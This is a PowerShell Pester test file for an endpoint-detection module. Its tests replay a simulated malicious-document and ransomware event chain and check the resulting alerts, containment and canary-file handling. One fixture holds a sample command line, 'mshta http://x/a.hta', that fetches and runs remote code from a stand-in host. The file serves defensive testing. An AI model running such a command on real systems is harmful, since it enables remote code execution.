BeforeDiscovery { Import-Module (Join-Path (Split-Path -Parent $PSScriptRoot) 'src/EdrCanary/EdrCanary.psd1') -Force }
BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    $script:Fixture = Join-Path $PSScriptRoot 'fixtures/maldoc_ransomware_chain.ndjson'
}

Describe 'Invoke-EdrEvent' {
    BeforeEach {
        $script:settings = New-TestSettings -OutputDir (Join-Path $TestDrive "out-$([guid]::NewGuid())")
        $script:canaries = @{ 'C:\Share\Finance\0_passwords.docx' = 'h' }
    }

    It 'runs the full maldoc -> ransomware chain and raises every expected alert' {
        $ctx = New-EdrContext -Settings $settings -Canaries $canaries
        $src = New-EdrReplaySource -Path $Fixture
        $alerts = while (-not $src.IsCompleted()) { Invoke-EdrEvent -Context $ctx -EdrEvent $src.Next(0) }
        $ids = @($alerts | ForEach-Object { $_.rule.id })
        $ids | Should -Contain 'EDR-PT-001'   # winword -> cmd and the indirect winword -> cmd -> powershell
        $ids | Should -Contain 'EDR-PT-002'   # winword -> rundll32
        $ids | Should -Contain 'EDR-RW-001'   # mass modification
        $ids | Should -Contain 'EDR-CN-001'   # canary
        $ids | Should -Not -Contain 'EDR-RW-002'  # same PID already alerted: no storm
        ($ids | Where-Object { $_ -like 'EDR-PT-*' }).Count | Should -Be 3
        $src.Stats().malformed | Should -Be 2   # the bogus type and the broken JSON line

        $ps = $alerts | Where-Object { $_.process.name -eq 'powershell.exe' }
        $ps.edr.ancestry | Should -Be 'explorer.exe(1200) -> winword.exe(3100) -> cmd.exe(3150) -> powershell.exe(3160)'
        $ps.event.severity | Should -Be 99   # encoded command / -w hidden escalate high -> critical
        $canary = $alerts | Where-Object { $_.rule.id -eq 'EDR-CN-001' }
        $canary.process.name | Should -Be 'svch0st.exe'
        $canary.process.pid | Should -Be 4100

        $lines = Get-Content -LiteralPath $ctx.AlertPath
        $lines.Count | Should -Be $alerts.Count
        ($lines[0] | ConvertFrom-Json).ecs.version | Should -Be '8.11.0'
    }

    It 'benign activity produces no alerts' {
        $ctx = New-EdrContext -Settings $settings -Canaries $canaries
        $events = @(
            New-TestEvent -Type ProcessStart -ProcessId 1 -ImageName 'explorer.exe'
            New-TestEvent -Type ProcessStart -ProcessId 2 -ParentProcessId 1 -ImageName 'powershell.exe' -Offset 1
            New-TestEvent -Type ProcessStart -ProcessId 3 -ParentProcessId 1 -ImageName 'winword.exe' -Offset 2
            New-TestEvent -Type ProcessStart -ProcessId 4 -ParentProcessId 3 -ImageName 'splwow64.exe' -Offset 3
            New-TestEvent -Type FileWrite -ProcessId 3 -FilePath 'C:\Users\dana\Documents\letter.docx' -Offset 4
        )
        @($events | ForEach-Object { Invoke-EdrEvent -Context $ctx -EdrEvent $_ }).Count | Should -Be 0
        Test-Path $ctx.AlertPath | Should -BeFalse
    }

    It 'auto-contains the offending process exactly once' {
        $settings.AutoContain = $true
        $calls = [System.Collections.Generic.List[object]]::new()
        $ctx = New-EdrContext -Settings $settings -Canaries $canaries -Contain {
            param($ProcessId, $ImageName, $Settings)
            $calls.Add(@($ProcessId, $ImageName))
            [pscustomobject]@{ Snapshot = 'snap.json' }
        }.GetNewClosure()
        $src = New-EdrReplaySource -Path $Fixture
        $alerts = while (-not $src.IsCompleted()) { Invoke-EdrEvent -Context $ctx -EdrEvent $src.Next(0) }
        $calls.Count | Should -Be 4      # cmd, powershell, rundll32, svch0st
        ($calls | ForEach-Object { $_[0] }) | Should -Be @(3150, 3160, 3170, 4100)
        ($alerts | Where-Object { $_.rule.id -eq 'EDR-CN-001' }).edr_response | Should -BeNullOrEmpty  # 4100 already contained
        ($alerts | Where-Object { $_.rule.id -eq 'EDR-RW-001' }).edr_response.status | Should -Be 'success'
        $ctx.Counters.contained | Should -Be 4
    }

    It 'records refused containment without crashing the monitor' {
        $settings.AutoContain = $true
        $ctx = New-EdrContext -Settings $settings -Canaries $canaries -Contain { throw 'Refusing to contain protected PID' }
        $e1 = New-TestEvent -Type ProcessStart -ProcessId 1 -ImageName 'winword.exe'
        $e2 = New-TestEvent -Type ProcessStart -ProcessId 2 -ParentProcessId 1 -ImageName 'cmd.exe' -Offset 1
        Invoke-EdrEvent -Context $ctx -EdrEvent $e1 | Out-Null
        $a = Invoke-EdrEvent -Context $ctx -EdrEvent $e2
        $a.edr_response.status | Should -Be 'refused'
        $ctx.Counters.containment_refused | Should -Be 1
    }

    It 'ProcessStop clears per-process behaviour state' {
        $ctx = New-EdrContext -Settings $settings
        Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type FileWrite -ProcessId 9 -FilePath 'C:\a') | Out-Null
        $ctx.Behavior.Windows.ContainsKey(9) | Should -BeTrue
        Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type ProcessStop -ProcessId 9) | Out-Null
        $ctx.Behavior.Windows.ContainsKey(9) | Should -BeFalse
    }
}

Describe 'Start-EdrMonitor (replay source)' {
    It 'deploys canaries, replays events and returns alerts' {
        $watch = Join-Path $TestDrive 'Share'
        $out = Join-Path $TestDrive 'monitor-out'
        $canary = Join-Path $watch '0_passwords.docx'
        $replay = Join-Path $TestDrive 'replay.ndjson'
        @(
            @{ Type = 'ProcessStart'; TimeStamp = '2026-10-26T09:00:00Z'; ProcessId = 10; ParentProcessId = 1; ImageName = 'excel.exe' }
            @{ Type = 'ProcessStart'; TimeStamp = '2026-10-26T09:00:01Z'; ProcessId = 11; ParentProcessId = 10; ImageName = 'mshta.exe'; CommandLine = 'mshta http://x/a.hta' }
            @{ Type = 'FileRename'; TimeStamp = '2026-10-26T09:00:02Z'; ProcessId = 11; FilePath = $canary }
        ) | ForEach-Object { $_ | ConvertTo-Json -Compress } | Set-Content -LiteralPath $replay
        $r = Start-EdrMonitor -Source Replay -ReplayPath $replay -WatchPaths $watch -OutputDir $out -EnvFile (Join-Path $TestDrive 'none.env') -PassThru -WarningAction SilentlyContinue -InformationAction SilentlyContinue
        Test-Path -LiteralPath $canary | Should -BeTrue
        $r.Canaries.Count | Should -Be 2
        @($r.Alerts.rule.id) | Should -Be @('EDR-PT-001', 'EDR-CN-001')
        $r.Alerts[0].event.severity | Should -Be 99   # http:// marker escalates high -> critical
        $r.Counters.events | Should -Be 3
        Test-Path (Join-Path $out 'alerts.ndjson') | Should -BeTrue
    }

    It 'requires watch paths and a replay file' {
        $env:EDR_WATCH_PATHS = $null
        { Start-EdrMonitor -Source Replay -ReplayPath x -EnvFile (Join-Path $TestDrive 'none.env') } | Should -Throw '*watch paths*'
        { Start-EdrMonitor -Source Replay -WatchPaths $TestDrive -OutputDir $TestDrive -EnvFile (Join-Path $TestDrive 'none.env') -InformationAction SilentlyContinue } | Should -Throw '*ReplayPath*'
    }
}
